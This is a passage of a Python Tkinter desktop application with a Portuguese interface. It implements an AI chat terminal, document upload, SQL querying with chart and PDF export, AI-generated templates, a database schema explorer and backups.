        self.chat_text['yscrollcommand'] = scrollbar.set

        input_frame = tk.Frame(main_frame, bg='#0a0a0a')
        input_frame.pack(fill=tk.X, pady=10)

        self.input_entry = tk.Entry(
            input_frame,
            bg='#002200',
            fg='#00ff00',
            insertbackground='#00ff00',
            font=('Courier New', 12)
        )
        self.input_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.input_entry.bind("<Return>", lambda e: self.process_query())
        send_btn = tk.Button(
            input_frame,
            text="🚀 Enviar",
            command=self.process_query,
            bg='#004400',
            fg='#00ff00',
            activebackground='#006600',
            font=('Courier New', 12, 'bold')
        )
        send_btn.pack(side=tk.RIGHT)

        self.update_chat("Sistema: Bem-vindo ao terminal de consulta IA\nDigite 'ajuda' para comandos disponíveis\n", "system")

    def upload_file_for_chat(self, parent_window):
        file_path = filedialog.askopenfilename(
            filetypes=[("Documentos", "*.pdf *.docx *.xlsx *.txt"), ("Todos", "*.*")]
        )
        if file_path:
            try:
                content = self.processor.extract_from_file(file_path)
                self.processor.document_content = content
                self.update_chat(f"Sistema: Arquivo carregado com sucesso: {os.path.basename(file_path)}\n", "system")
                self.update_chat(f"Resumo do documento:\n{content[:500]}...\n\n", "file")
            except Exception as e:
                self.update_chat(f"Erro ao processar arquivo: {str(e)}\n", "error")

    def clear_chat_context(self):
        self.processor.chat_context = []
        self.update_chat("Sistema: Contexto da conversa limpo com sucesso\n", "system")

    def process_query(self):
        query = self.input_entry.get().strip().lower()
        self.input_entry.delete(0, tk.END)
        
        if not query:
            return
            
        if query == 'ajuda':
            self.show_help()
            return
            
        if query in ['sair', 'exit', 'quit']:
            self.input_entry.winfo_toplevel().destroy()
            return
        
        if query.lower().startswith("otimizar sql"):
            self.optimize_query(query[12:])
            return

        if query.startswith("criar template"):
            self.handle_template_creation(query)
            return

        self.update_chat(f"Usuário: {query}\n", "user")
        
        try:
            if self.processor.document_content:
                prompt = f"Documento analisado:\n{self.processor.document_content[:2000]}\n\nPergunta: {query}\nInstruções: Responda de forma detalhada e técnica"
            else:
                prompt = f"Pergunta geral: {query}\nInstruções: Responda de forma completa e com exemplos quando possível"
            
            threading.Thread(target=self.generate_response, args=(prompt,), daemon=True).start()
        except Exception as e:
            self.update_chat(f"Erro: {str(e)}\n", "error")

    def _process_sql(self, params: dict):
        try:
            self.processor.db_manager.connect(params)
            result = self.processor.db_manager.execute_query(params['query'])
            
            if isinstance(result, list):
                # Opção de visualização em gráfico
                if messagebox.askyesno("Visualização", "Deseja visualizar os dados em gráfico?"):
                    self.show_chart(result)
                
                # Opção de exportar para PDF
                if messagebox.askyesno("Exportar", "Deseja exportar para PDF?"):
                    filename = filedialog.asksaveasfilename(
                        defaultextension=".pdf",
                        filetypes=[("PDF Files", "*.pdf")]
                    )
                    if filename:
                        analysis = self.processor.generate_ai_response(
                            f"Analise estes dados:\n{json.dumps(result[:10])}"
                        )
                        self.processor.export_to_pdf(
                            {"data": result, "analysis": analysis},
                            filename
                        )
                        self.show_info("PDF exportado com sucesso!")
        except Exception as e:
            self.show_error(str(e))

    def handle_template_creation(self, query: str):
        try:
            analysis_prompt = (
                f"Identifique o tipo de documento e campos solicitados nesta requisição: {query}. "
                "Responda no formato JSON: {'type': 'docx|xlsx', 'fields': ['campo1', 'campo2']}"
            )
            
            response = self.processor.generate_ai_response(analysis_prompt)
            params = json.loads(response)
            
            template_path = self.processor.generate_template(
                params['type'],
                params['fields']
            )
            
            self.update_chat(
                f"Template gerado com sucesso!\n"
                f"Campos incluídos: {', '.join(params['fields'])}\n"
                f"Caminho: {template_path}\n",
                "system"
            )
            
        except Exception as e:
            self.update_chat(f"Erro na criação: {str(e)}\n", "error")

    def generate_response(self, prompt: str):
        try:
            start_time = time.time()
            response = self.processor.generate_ai_response(prompt)
            elapsed_time = time.time() - start_time
            
            formatted_response = (
                f"IA ({elapsed_time:.2f}s):\n"
                f"{response}\n\n"
                f"{'-'*80}\n"
            )
            self.update_chat(formatted_response, "ai")
        except Exception as e:
            self.update_chat(f"Erro na geração: {str(e)}\n", "error")

    def show_help(self):
        help_text = """Comandos disponíveis:
/ajuda - Mostra esta mensagem
/limpar - Limpa o contexto da conversa
/sair - Fecha o chat
/carregar - Abre diálogo para carregar arquivo
/criar template - Cria um novo template com IA
"""
        self.update_chat(f"Sistema:\n{help_text}\n", "system")

    def update_chat(self, message: str, msg_type: str):
        color_map = {
            "user": "#00ff00",
            "ai": "#00ccff",
            "system": "#ff9900",
            "error": "#ff0000",
            "file": "#00ff88"
        }
        
        self.chat_text.config(state=tk.NORMAL)
        self.chat_text.tag_configure(msg_type, foreground=color_map[msg_type])
        self.chat_text.insert(tk.END, message, msg_type)
        self.chat_text.see(tk.END)
        self.chat_text.config(state=tk.DISABLED)

    def setup_db_explorer(self):
        """Janela para explorar a estrutura do banco de dados"""
        self.explorer_window = tk.Toplevel(self.root)
        self.explorer_window.title("Explorador de Banco de Dados")
        self.explorer_window.geometry("600x400")
        
        self.tree = ttk.Treeview(self.explorer_window)
        self.tree.pack(fill=tk.BOTH, expand=True)
        
        vsb = ttk.Scrollbar(self.explorer_window, orient="vertical", command=self.tree.yview)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.configure(yscrollcommand=vsb.set)
        
        self.explorer_window.withdraw()

    def show_db_explorer(self):
        """Atualiza e exibe o explorador de banco de dados"""
        try:
            schema = self.processor.db_manager.get_schema()
            self.tree.delete(*self.tree.get_children())
            
            for table in schema['tables']:
                table_id = self.tree.insert("", "end", text=table['name'], values=["Table"])
                for column in table['columns']:
                    self.tree.insert(table_id, "end", 
                                   text=f"{column['name']} ({column['type']})",
                                   values=["Column"])
            
            self.explorer_window.deiconify()
        except Exception as e:
            self.show_error(str(e))

    def create_backup(self):
        """Inicia processo de backup do banco de dados"""
        try:
            backup_path = self.processor.db_manager.backup_database()
            self.show_info(f"Backup criado com sucesso em:\n{backup_path}")
        except Exception as e:
            self.show_error(str(e))

    def show_chart(self, data: dict):
        """Exibe os dados em formato gráfico"""
        if self.current_chart_window:
            self.current_chart_window.destroy()
            
        self.current_chart_window = tk.Toplevel(self.root)
        self.current_chart_window.title("Visualização de Dados")
        
        fig = plt.Figure(figsize=(6, 4), dpi=100)
        ax = fig.add_subplot(111)
        
        if isinstance(data, list) and len(data) > 0:
            df = pd.DataFrame(data)
            df.plot(kind='bar', ax=ax)
            
            canvas = FigureCanvasTkAgg(fig, master=self.current_chart_window)
            canvas.draw()
            canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)



if __name__ == "__main__":
    if not os.path.exists(Config.TEMP_DIR):
        os.makedirs(Config.TEMP_DIR)
    if not os.path.exists(Config.BACKUP_DIR):
        os.makedirs(Config.BACKUP_DIR)
        
    app = Application()
    app.root.mainloop()